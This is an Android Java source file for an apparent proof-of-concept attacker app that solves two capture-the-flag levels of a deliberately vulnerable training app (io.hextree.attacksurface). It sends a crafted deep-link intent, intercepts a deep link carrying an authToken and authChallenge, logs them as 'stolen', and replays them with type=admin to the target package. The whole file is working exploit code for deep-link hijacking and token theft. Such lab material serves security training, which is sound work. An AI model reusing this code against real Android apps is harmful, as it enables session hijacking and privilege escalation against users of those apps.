package com.xylinz.poc;

import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.Toast;

import androidx.activity.EdgeToEdge;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.graphics.Insets;
import androidx.core.view.ViewCompat;
import androidx.core.view.WindowInsetsCompat;

public class Deeplink extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_deeplink);

        // Flag 13
        Button flag13 = findViewById(R.id.flag13_button);
        Intent flag13Intent = new Intent();
        flag13Intent.setData(Uri.parse("hex://flag?action=give-me"));
        flag13Intent.addCategory(flag13Intent.CATEGORY_BROWSABLE);
        flag13Intent.setAction(Intent.ACTION_VIEW);
        flag13Intent.putExtra("com.android.browser.application_id", "com.android.chrome");

        flag13.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                startActivity(flag13Intent);
            }
        });

        // Flag 14
        Intent receivedIntent = getIntent();
        Uri data = receivedIntent.getData();

        if (data != null && data.getScheme().equals("hex")) {
            String stolenToken = data.getQueryParameter("authToken");
            String activeChallenge = data.getQueryParameter("authChallenge");
            Log.d("HACKER", "Token dicuri: " + stolenToken);
            Log.d("HACKER", "Challenge dicuri: " + activeChallenge);

            if (stolenToken != null && activeChallenge != null) {
                startExploit(stolenToken, activeChallenge);
            }
        }
    }
    public void startExploit(String secretToken, String activeChallenge) {
        Uri exploitUri = Uri.parse("hex://token").buildUpon().appendQueryParameter("type", "admin").appendQueryParameter("authToken", secretToken).appendQueryParameter("authChallenge", activeChallenge).build();
        Intent exploitIntent = new Intent(Intent.ACTION_VIEW, exploitUri);
        exploitIntent.setPackage("io.hextree.attacksurface");
        exploitIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        Button flag14 = findViewById(R.id.flag14_button);

        flag14.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                startActivity(exploitIntent);
                finish();
            }
        });
    }
}